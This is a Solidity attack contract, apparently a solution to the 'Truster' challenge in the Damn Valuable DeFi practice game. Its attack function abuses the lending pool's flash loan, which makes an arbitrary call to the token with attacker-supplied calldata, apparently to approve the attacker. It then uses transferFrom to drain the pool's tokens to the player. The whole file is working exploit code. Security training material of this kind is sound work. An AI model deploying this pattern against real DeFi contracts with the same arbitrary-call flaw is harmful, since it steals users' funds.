// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableToken.sol";
import "./TrusterLenderPool.sol";


contract TrusterLenderAttack {
    using Address for address;

    DamnValuableToken public immutable token;
    TrusterLenderPool public immutable pool;
    address player;

    constructor(DamnValuableToken _token, TrusterLenderPool _pool) {
        token = _token;
        pool = _pool;
        player = msg.sender;
    }

    function attack(uint256 amount, bytes calldata data) public {
        pool.flashLoan(
            amount,
            address(pool),
            address(token),
            data
        );
        token.transferFrom(address(pool), player, amount);
    }
}
